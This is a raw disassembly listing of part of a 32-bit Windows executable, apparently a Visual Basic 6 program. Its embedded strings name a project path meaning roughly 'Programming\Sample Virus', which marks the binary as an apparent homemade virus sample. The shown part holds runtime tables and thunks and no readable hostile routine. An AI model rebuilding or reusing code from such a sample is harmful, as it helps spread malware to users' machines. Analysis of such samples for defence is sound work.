  40712e:	40                   	inc    %eax
  40712f:	00 68 85             	add    %ch,-0x7b(%eax)
  407132:	40                   	inc    %eax
  407133:	00 34 87             	add    %dh,(%edi,%eax,4)
  407136:	40                   	inc    %eax
  407137:	00 b8 86 40 00 d4    	add    %bh,-0x2bffbf7a(%eax)
  40713d:	87 40 00             	xchg   %eax,0x0(%eax)
  407140:	58                   	pop    %eax
  407141:	87 40 00             	xchg   %eax,0x0(%eax)
  407144:	28 73 40             	sub    %dh,0x40(%ebx)
  407147:	00 2a                	add    %ch,(%edx)
  407149:	02 02                	add    (%edx),%al
  40714b:	01 78 8d             	add    %edi,-0x73(%eax)
  40714e:	40                   	inc    %eax
  40714f:	00 b4 a3 40 00 9c a0 	add    %dh,-0x5f63ffc0(%ebx,%eiz,4)
  407156:	40                   	inc    %eax
  407157:	00 38                	add    %bh,(%eax)
  407159:	a2 40 00 ba 78       	mov    %al,0x78ba0040
  40715e:	8d 40 00             	lea    0x0(%eax),%eax
  407161:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  407166:	ff e1                	jmp    *%ecx
  407168:	ba b4 a3 40 00       	mov    $0x40a3b4,%edx
  40716d:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  407172:	ff e1                	jmp    *%ecx
  407174:	ba 9c a0 40 00       	mov    $0x40a09c,%edx
  407179:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  40717e:	ff e1                	jmp    *%ecx
  407180:	ba 38 a2 40 00       	mov    $0x40a238,%edx
  407185:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  40718a:	ff e1                	jmp    *%ecx
  40718c:	01 00                	add    %eax,(%eax)
  40718e:	07                   	pop    %es
  40718f:	00 2c 78             	add    %ch,(%eax,%edi,2)
  407192:	40                   	inc    %eax
  407193:	00 00                	add    %al,(%eax)
  407195:	00 00                	add    %al,(%eax)
  407197:	00 ff                	add    %bh,%bh
  407199:	ff                   	(bad)
  40719a:	ff                   	(bad)
  40719b:	ff                   	(bad)
  40719c:	ff                   	(bad)
  40719d:	ff                   	(bad)
  40719e:	ff                   	(bad)
  40719f:	ff 00                	incl   (%eax)
  4071a1:	00 00                	add    %al,(%eax)
  4071a3:	00 d0                	add    %dl,%al
  4071a5:	79 40                	jns    0x4071e7
  4071a7:	00 68 c0             	add    %ch,-0x40(%eax)
  4071aa:	40                   	inc    %eax
  4071ab:	00 1b                	add    %bl,(%ebx)
  4071ad:	00 00                	add    %al,(%eax)
  4071af:	00 44 72 40          	add    %al,0x40(%edx,%esi,2)
  4071b3:	00 20                	add    %ah,(%eax)
  4071b5:	00 40 00             	add    %al,0x0(%eax)
  4071b8:	00 00                	add    %al,(%eax)
  4071ba:	00 00                	add    %al,(%eax)
  4071bc:	dc de                	(bad)
  4071be:	22 00                	and    (%eax),%al
  4071c0:	c4 71 40             	les    0x40(%ecx),%esi
  4071c3:	00 ac 7b 40 00 1c 73 	add    %ch,0x731c0040(%ebx,%edi,2)
  4071ca:	40                   	inc    %eax
  4071cb:	00 c8                	add    %cl,%al
  4071cd:	80 40 00 00          	addb   $0x0,0x0(%eax)
  4071d1:	82 40 00 b4          	addb   $0xb4,0x0(%eax)
  4071d5:	10 40 00             	adc    %al,0x0(%eax)
  4071d8:	d4 7b                	aam    $0x7b
  4071da:	40                   	inc    %eax
  4071db:	00 d8                	add    %bl,%al
  4071dd:	10 40 00             	adc    %al,0x0(%eax)
  4071e0:	44                   	inc    %esp
  4071e1:	82 40 00 80          	addb   $0x80,0x0(%eax)
  4071e5:	7b 40                	jnp    0x407227
  4071e7:	00 8c 82 40 00 10 73 	add    %cl,0x73100040(%edx,%eax,4)
  4071ee:	40                   	inc    %eax
  4071ef:	00 a0 81 40 00 34    	add    %ah,0x34004081(%eax)
  4071f5:	80 40 00 f6          	addb   $0xf6,0x0(%eax)
  4071f9:	10 40 00             	adc    %al,0x0(%eax)
  4071fc:	d4 82                	aam    $0x82
  4071fe:	40                   	inc    %eax
  4071ff:	00 fc                	add    %bh,%ah
  407201:	10 40 00             	adc    %al,0x0(%eax)
  407204:	5c                   	pop    %esp
  407205:	8b 40 00             	mov    0x0(%eax),%eax
  407208:	1c 83                	sbb    $0x83,%al
  40720a:	40                   	inc    %eax
  40720b:	00 64 8b 40          	add    %ah,0x40(%ebx,%ecx,4)
  40720f:	00 74 7e 40          	add    %dh,0x40(%esi,%edi,2)
  407213:	00 58 81             	add    %bl,-0x7f(%eax)
  407216:	40                   	inc    %eax
  407217:	00 10                	add    %dl,(%eax)
  407219:	81 40 00 80 80 40 00 	addl   $0x408080,0x0(%eax)
  407220:	02 11                	add    (%ecx),%dl
  407222:	40                   	inc    %eax
  407223:	00 08                	add    %cl,(%eax)
  407225:	11 40 00             	adc    %eax,0x0(%eax)
  407228:	a8 84                	test   $0x84,%al
  40722a:	40                   	inc    %eax
  40722b:	00 5c 84 40          	add    %bl,0x40(%esp,%eax,4)
  40722f:	00 a8 10 40 00 c4    	add    %ch,-0x3bffbff0(%eax)
  407235:	7e 40                	jle    0x407277
  407237:	00 10                	add    %dl,(%eax)
  407239:	84 40 00             	test   %al,0x0(%eax)
  40723c:	c0 83 40 00 64 83 40 	rolb   $0x40,-0x7c9bffc0(%ebx)
  407243:	00 43 00             	add    %al,0x0(%ebx)
  407246:	3a 00                	cmp    (%eax),%al
  407248:	5c                   	pop    %esp
  407249:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40724d:	00 63 00             	add    %ah,0x0(%ebx)
  407250:	75 00                	jne    0x407252
  407252:	6d                   	insl   (%dx),%es:(%edi)
  407253:	00 65 00             	add    %ah,0x0(%ebp)
  407256:	6e                   	outsb  %ds:(%esi),(%dx)
  407257:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40725b:	00 20                	add    %ah,(%eax)
  40725d:	00 61 00             	add    %ah,0x0(%ecx)
  407260:	6e                   	outsb  %ds:(%esi),(%dx)
  407261:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  407265:	00 53 00             	add    %dl,0x0(%ebx)
  407268:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  40726d:	00 69 00             	add    %ch,0x0(%ecx)
  407270:	6e                   	outsb  %ds:(%esi),(%dx)
  407271:	00 67 00             	add    %ah,0x0(%edi)
  407274:	73 00                	jae    0x407276
  407276:	5c                   	pop    %esp
  407277:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40727b:	00 63 00             	add    %ah,0x0(%ebx)
  40727e:	44                   	inc    %esp
  40727f:	00 75 00             	add    %dh,0x0(%ebp)
  407282:	6e                   	outsb  %ds:(%esi),(%dx)
  407283:	00 28                	add    %ch,(%eax)
  407285:	9b                   	fwait
  407286:	40                   	inc    %eax
  407287:	00 84 98 40 00 70 91 	add    %al,-0x6e8fffc0(%eax,%ebx,4)
  40728e:	40                   	inc    %eax
  40728f:	00 84 ab 40 00 60 a9 	add    %al,-0x569fffc0(%ebx,%ebp,4)
  407296:	40                   	inc    %eax
  407297:	00 6c a7 40          	add    %ch,0x40(%edi,%eiz,4)
  40729b:	00 28                	add    %ch,(%eax)
  40729d:	8f 40 00             	pop    0x0(%eax)
  4072a0:	58                   	pop    %eax
  4072a1:	97                   	xchg   %eax,%edi
  4072a2:	40                   	inc    %eax
  4072a3:	00 88 a5 40 00 c4    	add    %cl,-0x3bffbf5b(%eax)
  4072a9:	99                   	cltd
  4072aa:	40                   	inc    %eax
  4072ab:	00 04 8e             	add    %al,(%esi,%ecx,4)
  4072ae:	40                   	inc    %eax
  4072af:	00 ba 28 9b 40 00    	add    %bh,0x409b28(%edx)
  4072b5:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072ba:	ff e1                	jmp    *%ecx
  4072bc:	ba 84 98 40 00       	mov    $0x409884,%edx
  4072c1:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072c6:	ff e1                	jmp    *%ecx
  4072c8:	ba 70 91 40 00       	mov    $0x409170,%edx
  4072cd:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072d2:	ff e1                	jmp    *%ecx
  4072d4:	ba 84 ab 40 00       	mov    $0x40ab84,%edx
  4072d9:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072de:	ff e1                	jmp    *%ecx
  4072e0:	ba 60 a9 40 00       	mov    $0x40a960,%edx
  4072e5:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072ea:	ff e1                	jmp    *%ecx
  4072ec:	ba 6c a7 40 00       	mov    $0x40a76c,%edx
  4072f1:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  4072f6:	ff e1                	jmp    *%ecx
  4072f8:	ba 28 8f 40 00       	mov    $0x408f28,%edx
  4072fd:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  407302:	ff e1                	jmp    *%ecx
  407304:	ba 58 97 40 00       	mov    $0x409758,%edx
  407309:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  40730e:	ff e1                	jmp    *%ecx
  407310:	ba 88 a5 40 00       	mov    $0x40a588,%edx
  407315:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  40731a:	ff e1                	jmp    *%ecx
  40731c:	ba c4 99 40 00       	mov    $0x4099c4,%edx
  407321:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  407326:	ff e1                	jmp    *%ecx
  407328:	ba 04 8e 40 00       	mov    $0x408e04,%edx
  40732d:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  407332:	ff e1                	jmp    *%ecx
  407334:	f4                   	hlt
  407335:	01 00                	add    %eax,(%eax)
  407337:	00 2c 78             	add    %ch,(%eax,%edi,2)
  40733a:	40                   	inc    %eax
  40733b:	00 00                	add    %al,(%eax)
  40733d:	00 00                	add    %al,(%eax)
  40733f:	00 60 b1             	add    %ah,-0x4f(%eax)
  407342:	40                   	inc    %eax
  407343:	00 70 b1             	add    %dh,-0x4f(%eax)
  407346:	40                   	inc    %eax
  407347:	00 b8 0f 00 00 00    	add    %bh,0xf(%eax)
  40734d:	c0 40 00 26          	rolb   $0x26,0x0(%eax)
  407351:	11 40 00             	adc    %eax,0x0(%eax)
  407354:	00 00                	add    %al,(%eax)
  407356:	00 00                	add    %al,(%eax)
  407358:	2a 00                	sub    (%eax),%al
  40735a:	5c                   	pop    %esp
  40735b:	00 41 00             	add    %al,0x0(%ecx)
  40735e:	44                   	inc    %esp
  40735f:	00 3a                	add    %bh,(%edx)
  407361:	00 5c 00 4c          	add    %bl,0x4c(%eax,%eax,1)
  407365:	00 61 00             	add    %ah,0x0(%ecx)
  407368:	70 00                	jo     0x40736a
  40736a:	20 00                	and    %al,(%eax)
  40736c:	54                   	push   %esp
  40736d:	00 72 00             	add    %dh,0x0(%edx)
  407370:	69 00 6e 00 68 00    	imul   $0x68006e,(%eax),%eax
  407376:	5c                   	pop    %esp
  407377:	00 56 00             	add    %dl,0x0(%esi)
  40737a:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  407380:	73 00                	jae    0x407382
  407382:	20 00                	and    %al,(%eax)
  407384:	4d                   	dec    %ebp
  407385:	00 61 00             	add    %ah,0x0(%ecx)
  407388:	75 00                	jne    0x40738a
  40738a:	5c                   	pop    %esp
  40738b:	00 50 00             	add    %dl,0x0(%eax)
  40738e:	72 00                	jb     0x407390
  407390:	6f                   	outsl  %ds:(%esi),(%dx)
  407391:	00 20                	add    %ah,(%eax)
  407393:	00 33                	add    %dh,(%ebx)
  407395:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  407399:	00 72 00             	add    %dh,0x0(%edx)
  40739c:	6f                   	outsl  %ds:(%esi),(%dx)
  40739d:	00 33                	add    %dh,(%ebx)
  40739f:	00 2e                	add    %ch,(%esi)
  4073a1:	00 76 00             	add    %dh,0x0(%esi)
  4073a4:	62 00                	bound  %eax,(%eax)
  4073a6:	70 00                	jo     0x4073a8
	...
  407568:	98                   	cwtl
  407569:	6f                   	outsl  %ds:(%esi),(%dx)
  40756a:	40                   	inc    %eax
  40756b:	00 1d 00 00 00 01    	add    %bl,0x1000000
  407571:	00 00                	add    %al,(%eax)
  407573:	00 2c 78             	add    %ch,(%eax,%edi,2)
  407576:	40                   	inc    %eax
  407577:	00 00                	add    %al,(%eax)
  407579:	00 00                	add    %al,(%eax)
  40757b:	00 a8 8c 40 00 ff    	add    %ch,-0xffbf74(%eax)
  407581:	ff                   	(bad)
  407582:	ff                   	(bad)
  407583:	ff 00                	incl   (%eax)
  407585:	00 00                	add    %al,(%eax)
  407587:	00 80 78 40 00 00    	add    %al,0x4078(%eax)
  40758d:	c0 40 00 05          	rolb   $0x5,0x0(%eax)
  407591:	00 00                	add    %al,(%eax)
  407593:	00 50 76             	add    %dl,0x76(%eax)
  407596:	40                   	inc    %eax
  407597:	00 1a                	add    %bl,(%edx)
  407599:	00 20                	add    %ah,(%eax)
  40759b:	00 00                	add    %al,(%eax)
  40759d:	00 00                	add    %al,(%eax)
  40759f:	00 d4                	add    %dl,%ah
  4075a1:	57                   	push   %edi
  4075a2:	1e                   	push   %ds
  4075a3:	00 e8                	add    %ch,%al
  4075a5:	75 40                	jne    0x4075e7
  4075a7:	00 01                	add    %al,(%ecx)
  4075a9:	00 00                	add    %al,(%eax)
  4075ab:	00 e8                	add    %ch,%al
  4075ad:	7b 40                	jnp    0x4075ef
  4075af:	00 00                	add    %al,(%eax)
  4075b1:	00 00                	add    %al,(%eax)
  4075b3:	00 64 76 40          	add    %ah,0x40(%esi,%esi,2)
  4075b7:	00 01                	add    %al,(%ecx)
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 6c 76 40          	add    %ch,0x40(%esi,%esi,2)
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 68 76             	add    %ch,0x76(%eax)
  4075c6:	40                   	inc    %eax
  4075c7:	00 03                	add    %al,(%ebx)
  4075c9:	00 00                	add    %al,(%eax)
  4075cb:	00 6c 76 40          	add    %ch,0x40(%esi,%esi,2)
  4075cf:	00 02                	add    %al,(%edx)
  4075d1:	00 b7 01 68 00 6c    	add    %dh,0x6c006801(%edi)
  4075d7:	00 e4                	add    %ah,%ah
  4075d9:	76 40                	jbe    0x40761b
  4075db:	00 ac c8 40 00 00 00 	add    %ch,0x40(%eax,%ecx,8)
  4075e2:	00 00                	add    %al,(%eax)
  4075e4:	80 d1 19             	adc    $0x19,%cl
  4075e7:	00 4c c7 40          	add    %cl,0x40(%edi,%eax,8)
  4075eb:	00 e4                	add    %ah,%ah
  4075ed:	7d 40                	jge    0x40762f
  4075ef:	00 d4                	add    %dl,%ah
  4075f1:	7d 40                	jge    0x407633
  4075f3:	00 f4                	add    %dh,%ah
  4075f5:	7d 40                	jge    0x407637
  4075f7:	00 80 71 40 00 c0    	add    %al,-0x3fffbf8f(%eax)
  4075fd:	6b 40 00 96          	imul   $0xffffff96,0x0(%eax),%eax
  407601:	10 40 00             	adc    %al,0x0(%eax)
  407604:	d4 7b                	aam    $0x7b
  407606:	40                   	inc    %eax
  407607:	00 9c 10 40 00 7c 6d 	add    %bl,0x6d7c0040(%eax,%edx,1)
  40760e:	40                   	inc    %eax
  40760f:	00 54 7e 40          	add    %dl,0x40(%esi,%edi,2)
  407613:	00 74 71 40          	add    %dh,0x40(%ecx,%esi,2)
  407617:	00 60 7e             	add    %ah,0x7e(%eax)
  40761a:	40                   	inc    %eax
  40761b:	00 74 7e 40          	add    %dh,0x40(%esi,%edi,2)
  40761f:	00 5c 71 40          	add    %bl,0x40(%ecx,%esi,2)
  407623:	00 68 71             	add    %ch,0x71(%eax)
  407626:	40                   	inc    %eax
  407627:	00 a4 7e 40 00 7c 7e 	add    %ah,0x7e7c0040(%esi,%edi,2)
  40762e:	40                   	inc    %eax
  40762f:	00 a2 10 40 00 b8    	add    %ah,-0x47ffbff0(%edx)
  407635:	7e 40                	jle    0x407677
  407637:	00 10                	add    %dl,(%eax)
  407639:	7d 40                	jge    0x40767b
  40763b:	00 a8 10 40 00 c4    	add    %ch,-0x3bffbff0(%eax)
  407641:	7e 40                	jle    0x407683
  407643:	00 58 7d             	add    %bl,0x7d(%eax)
  407646:	40                   	inc    %eax
  407647:	00 9c 7d 40 00 88 6d 	add    %bl,0x6d880040(%ebp,%edi,2)
  40764e:	40                   	inc    %eax
  40764f:	00 00                	add    %al,(%eax)
  407651:	00 00                	add    %al,(%eax)
  407653:	00 ff                	add    %bh,%bh
  407655:	ff                   	(bad)
  407656:	ff                   	(bad)
  407657:	ff                   	(bad)
  407658:	ff                   	(bad)
  407659:	ff                   	(bad)
  40765a:	ff                   	(bad)
  40765b:	ff                   	ljmp   (bad)
  40765c:	e8 b0 40 00 8c       	call   0x8c40b711
  407661:	90                   	nop
  407662:	40                   	inc    %eax
  407663:	00 f8                	add    %bh,%al
  407665:	7b 40                	jnp    0x4076a7
  407667:	00 08                	add    %cl,(%eax)
  407669:	7c 40                	jl     0x4076ab
  40766b:	00 40 00             	add    %al,0x0(%eax)
  40766e:	14 00                	adc    $0x0,%al
  407670:	34 00                	xor    $0x0,%al
  407672:	00 00                	add    %al,(%eax)
  407674:	18 7c 40 00          	sbb    %bh,0x0(%eax,%eax,2)
  407678:	01 00                	add    %eax,(%eax)
  40767a:	03 00                	add    (%eax),%eax
	...
  407684:	ec                   	in     (%dx),%al
  407685:	76 40                	jbe    0x4076c7
  407687:	00 90 d4 19 00 28    	add    %dl,0x280019d4(%eax)
  40768d:	7c 40                	jl     0x4076cf
  40768f:	00 01                	add    %al,(%ecx)
  407691:	00 03                	add    %al,(%ebx)
  407693:	00 40 00             	add    %al,0x0(%eax)
  407696:	01 00                	add    %eax,(%eax)
  407698:	38 00                	cmp    %al,(%eax)
  40769a:	00 00                	add    %al,(%eax)
  40769c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40769d:	7c 40                	jl     0x4076df
  40769f:	00 02                	add    %al,(%edx)
  4076a1:	00 03                	add    %al,(%ebx)
	...
  4076ab:	00 54 77 40          	add    %dl,0x40(%edi,%esi,2)
  4076af:	00 a0 d4 19 00 b4    	add    %ah,-0x4bffe62c(%eax)
  4076b5:	7c 40                	jl     0x4076f7
  4076b7:	00 02                	add    %al,(%edx)
  4076b9:	00 03                	add    %al,(%ebx)
  4076bb:	00 40 00             	add    %al,0x0(%eax)
  4076be:	1f                   	pop    %ds
  4076bf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4076c2:	00 00                	add    %al,(%eax)
  4076c4:	bc 7c 40 00 ff       	mov    $0xff00407c,%esp
  4076c9:	ff                   	(bad)
  4076ca:	ff                   	(bad)
  4076cb:	ff 00                	incl   (%eax)
  4076cd:	00 00                	add    %al,(%eax)
  4076cf:	00 00                	add    %al,(%eax)
  4076d1:	00 00                	add    %al,(%eax)
  4076d3:	00 70 77             	add    %dh,0x77(%eax)
  4076d6:	40                   	inc    %eax
  4076d7:	00 b0 d4 19 00 cc    	add    %dh,-0x33ffe62c(%eax)
  4076dd:	7c 40                	jl     0x40771f
  4076df:	00 ff                	add    %bh,%bh
  4076e1:	ff                   	(bad)
  4076e2:	ff                   	(bad)
  4076e3:	ff 0b                	decl   (%ebx)
  4076e5:	78 40                	js     0x407727
  4076e7:	00 1f                	add    %bl,(%edi)
  4076e9:	78 40                	js     0x40772b
  4076eb:	00 00                	add    %al,(%eax)
  4076ed:	00 00                	add    %al,(%eax)
  4076ef:	00 6c 76 40          	add    %ch,0x40(%esi,%esi,2)
  4076f3:	00 70 75             	add    %dh,0x75(%eax)
  4076f6:	40                   	inc    %eax
  4076f7:	00 32                	add    %dh,(%edx)
  4076f9:	11 40 00             	adc    %eax,0x0(%eax)
  4076fc:	38 11                	cmp    %dl,(%ecx)
  4076fe:	40                   	inc    %eax
  4076ff:	00 3e                	add    %bh,(%esi)
  407701:	11 40 00             	adc    %eax,0x0(%eax)
	...
  407758:	94                   	xchg   %eax,%esp
  407759:	76 40                	jbe    0x40779b
  40775b:	00 70 75             	add    %dh,0x75(%eax)
  40775e:	40                   	inc    %eax
  40775f:	00 32                	add    %dh,(%edx)
  407761:	11 40 00             	adc    %eax,0x0(%eax)
  407764:	38 11                	cmp    %dl,(%ecx)
  407766:	40                   	inc    %eax
  407767:	00 3e                	add    %bh,(%esi)
  407769:	11 40 00             	adc    %eax,0x0(%eax)
  40776c:	18 78 40             	sbb    %bh,0x40(%eax)
  40776f:	00 00                	add    %al,(%eax)
  407771:	00 00                	add    %al,(%eax)
  407773:	00 bc 76 40 00 70 75 	add    %bh,0x75700040(%esi,%esi,2)
  40777a:	40                   	inc    %eax
  40777b:	00 32                	add    %dh,(%edx)
  40777d:	11 40 00             	adc    %eax,0x0(%eax)
  407780:	38 11                	cmp    %dl,(%ecx)
  407782:	40                   	inc    %eax
  407783:	00 3e                	add    %bh,(%esi)
  407785:	11 40 00             	adc    %eax,0x0(%eax)
	...
  4077a0:	04 78                	add    $0x78,%al
  4077a2:	40                   	inc    %eax
	...
  407803:	00 b8 3c 00 00 00    	add    %bh,0x3c(%eax)
  407809:	66 3d 33 c0          	cmp    $0xc033,%ax
  40780d:	ba e8 b0 40 00       	mov    $0x40b0e8,%edx
  407812:	68 44 11 40 00       	push   $0x401144
  407817:	c3                   	ret
  407818:	b8 38 00 00 00       	mov    $0x38,%eax
  40781d:	66 3d 33 c0          	cmp    $0xc033,%ax
  407821:	ba 8c 90 40 00       	mov    $0x40908c,%edx
  407826:	68 44 11 40 00       	push   $0x401144
  40782b:	c3                   	ret
  40782c:	00 00                	add    %al,(%eax)
  40782e:	00 00                	add    %al,(%eax)
  407830:	d8 c0                	fadd   %st(0),%st
  407832:	40                   	inc    %eax
  407833:	00 e8                	add    %ch,%al
  407835:	8c 40 00             	mov    %es,0x0(%eax)
  407838:	ff                   	(bad)
  407839:	ff                   	(bad)
  40783a:	ff                   	(bad)
  40783b:	ff 00                	incl   (%eax)
  40783d:	00 00                	add    %al,(%eax)
  40783f:	00 c8                	add    %cl,%al
  407841:	c0 40 00 6c          	rolb   $0x6c,0x0(%eax)
  407845:	6e                   	outsb  %ds:(%esi),(%dx)
  407846:	5f                   	pop    %edi
  407847:	66 1d 62 41          	sbb    $0x4162,%ax
  40784b:	49                   	dec    %ecx
  40784c:	a0 06 1e 3c 42       	mov    0x423c1e06,%al
  407851:	1c 4e                	sbb    $0x4e,%al
  407853:	07                   	pop    %es
  407854:	0a 00                	or     (%eax),%al
  407856:	0c 00                	or     $0x0,%al
  407858:	0c 00                	or     $0x0,%al
  40785a:	0c 00                	or     $0x0,%al
  40785c:	80 78 40 00          	cmpb   $0x0,0x40(%eax)
	...
  40786c:	d8 7a 40             	fdivrs 0x40(%edx)
  40786f:	00 09                	add    %cl,(%ecx)
  407871:	04 00                	add    $0x0,%al
  407873:	00 09                	add    %cl,(%ecx)
  407875:	04 00                	add    $0x0,%al
  407877:	00 00                	add    %al,(%eax)
  407879:	00 00                	add    %al,(%eax)
  40787b:	00 02                	add    %al,(%edx)
  40787d:	00 00                	add    %al,(%eax)
  40787f:	00 70 75             	add    %dh,0x75(%eax)
  407882:	40                   	inc    %eax
  407883:	00 ff                	add    %bh,%bh
  407885:	ff                   	(bad)
  407886:	ff                   	(bad)
  407887:	ff                   	(bad)
  407888:	b8 7d 40 00 00       	mov    $0x407d,%eax
	...
  407895:	00 00                	add    %al,(%eax)
  407897:	00 e4                	add    %ah,%ah
  407899:	7a 40                	jp     0x4078db
  40789b:	00 05 00 00 00 c0    	add    %al,0xc0000000
  4078a1:	7a 40                	jp     0x4078e3
  4078a3:	00 ff                	add    %bh,%bh
  4078a5:	ff 00                	incl   (%eax)
  4078a7:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
  4078ad:	00 00                	add    %al,(%eax)
  4078af:	00 d0                	add    %dl,%al
  4078b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b2:	40                   	inc    %eax
  4078b3:	00 ff                	add    %bh,%bh
  4078b5:	ff                   	(bad)
  4078b6:	ff                   	(bad)
  4078b7:	ff a4 7f 40 00 00 00 	jmp    *0x40(%edi,%edi,2)
	...
  4078c6:	00 00                	add    %al,(%eax)
  4078c8:	f0 7a 40             	lock jp 0x40790b
  4078cb:	00 00                	add    %al,(%eax)
  4078cd:	00 00                	add    %al,(%eax)
  4078cf:	00 b0 58 1b 00 ff    	add    %dh,-0xffe4a8(%eax)
  4078d5:	ff 00                	incl   (%eax)
  4078d7:	00 03                	add    %al,(%ebx)
  4078d9:	80 11 00             	adcb   $0x0,(%ecx)
  4078dc:	00 00                	add    %al,(%eax)
  4078de:	00 00                	add    %al,(%eax)
  4078e0:	80 70 40 00          	xorb   $0x0,0x40(%eax)
  4078e4:	ff                   	(bad)
  4078e5:	ff                   	(bad)
  4078e6:	ff                   	(bad)
  4078e7:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  4078eb:	00 00                	add    %al,(%eax)
  4078ed:	00 00                	add    %al,(%eax)
  4078ef:	00 1c c0             	add    %bl,(%eax,%eax,8)
  4078f2:	40                   	inc    %eax
  4078f3:	00 00                	add    %al,(%eax)
  4078f5:	00 00                	add    %al,(%eax)
  4078f7:	00 fc                	add    %bh,%ah
  4078f9:	7a 40                	jp     0x40793b
  4078fb:	00 05 00 00 00 00    	add    %al,0x0
  407901:	00 00                	add    %al,(%eax)
  407903:	00 ff                	add    %bh,%bh
  407905:	ff 00                	incl   (%eax)
  407907:	00 01                	add    %al,(%ecx)
  407909:	80 01 00             	addb   $0x0,(%ecx)
  40790c:	00 00                	add    %al,(%eax)
  40790e:	00 00                	add    %al,(%eax)
  407910:	30 6e 40             	xor    %ch,0x40(%esi)
  407913:	00 ff                	add    %bh,%bh
  407915:	ff                   	(bad)
  407916:	ff                   	(bad)
  407917:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  40791b:	00 00                	add    %al,(%eax)
  40791d:	00 00                	add    %al,(%eax)
  40791f:	00 60 c0             	add    %ah,-0x40(%eax)
  407922:	40                   	inc    %eax
  407923:	00 00                	add    %al,(%eax)
  407925:	00 00                	add    %al,(%eax)
  407927:	00 08                	add    %cl,(%eax)
  407929:	7b 40                	jnp    0x40796b
  40792b:	00 03                	add    %al,(%ebx)
  40792d:	00 00                	add    %al,(%eax)
  40792f:	00 00                	add    %al,(%eax)
  407931:	00 00                	add    %al,(%eax)
  407933:	00 ff                	add    %bh,%bh
  407935:	ff 00                	incl   (%eax)
  407937:	00 01                	add    %al,(%ecx)
  407939:	80 01 00             	addb   $0x0,(%ecx)
  40793c:	00 00                	add    %al,(%eax)
  40793e:	00 00                	add    %al,(%eax)
  407940:	94                   	xchg   %eax,%esp
  407941:	6c                   	insb   (%dx),%es:(%edi)
  407942:	40                   	inc    %eax
  407943:	00 ff                	add    %bh,%bh
  407945:	ff                   	(bad)
  407946:	ff                   	(bad)
  407947:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  40794b:	00 00                	add    %al,(%eax)
  40794d:	00 00                	add    %al,(%eax)
  40794f:	00 80 c0 40 00 00    	add    %al,0x40c0(%eax)
  407955:	00 00                	add    %al,(%eax)
  407957:	00 0c 7b             	add    %cl,(%ebx,%edi,2)
  40795a:	40                   	inc    %eax
  40795b:	00 02                	add    %al,(%edx)
  40795d:	00 00                	add    %al,(%eax)
  40795f:	00 00                	add    %al,(%eax)
  407961:	00 00                	add    %al,(%eax)
  407963:	00 ff                	add    %bh,%bh
  407965:	ff 00                	incl   (%eax)
  407967:	00 01                	add    %al,(%ecx)
  407969:	80 01 00             	addb   $0x0,(%ecx)
  40796c:	00 00                	add    %al,(%eax)
  40796e:	00 00                	add    %al,(%eax)
  407970:	14 6b                	adc    $0x6b,%al
  407972:	40                   	inc    %eax
  407973:	00 ff                	add    %bh,%bh
  407975:	ff                   	(bad)
  407976:	ff                   	(bad)
  407977:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  40797b:	00 00                	add    %al,(%eax)
  40797d:	00 00                	add    %al,(%eax)
  40797f:	00 c0                	add    %al,%al
  407981:	c0 40 00 00          	rolb   $0x0,0x0(%eax)
  407985:	00 00                	add    %al,(%eax)
  407987:	00 18                	add    %bl,(%eax)
  407989:	7b 40                	jnp    0x4079cb
  40798b:	00 08                	add    %cl,(%eax)
  40798d:	00 00                	add    %al,(%eax)
  40798f:	00 00                	add    %al,(%eax)
  407991:	00 00                	add    %al,(%eax)
  407993:	00 ff                	add    %bh,%bh
  407995:	ff 00                	incl   (%eax)
  407997:	00 01                	add    %al,(%ecx)
  407999:	80 01 00             	addb   $0x0,(%ecx)
  40799c:	00 00                	add    %al,(%eax)
  40799e:	00 00                	add    %al,(%eax)
  4079a0:	30 6c 40 00          	xor    %ch,0x0(%eax,%eax,2)
  4079a4:	ff                   	(bad)
  4079a5:	ff                   	(bad)
  4079a6:	ff                   	(bad)
  4079a7:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  4079ab:	00 00                	add    %al,(%eax)
  4079ad:	00 00                	add    %al,(%eax)
  4079af:	00 a0 c0 40 00 00    	add    %ah,0x40c0(%eax)
  4079b5:	00 00                	add    %al,(%eax)
  4079b7:	00 1c 7b             	add    %bl,(%ebx,%edi,2)
  4079ba:	40                   	inc    %eax
  4079bb:	00 01                	add    %al,(%ecx)
  4079bd:	00 00                	add    %al,(%eax)
  4079bf:	00 00                	add    %al,(%eax)
  4079c1:	00 00                	add    %al,(%eax)
  4079c3:	00 ff                	add    %bh,%bh
  4079c5:	ff 00                	incl   (%eax)
  4079c7:	00 01                	add    %al,(%ecx)
  4079c9:	80 01 00             	addb   $0x0,(%ecx)
  4079cc:	00 00                	add    %al,(%eax)
  4079ce:	00 00                	add    %al,(%eax)
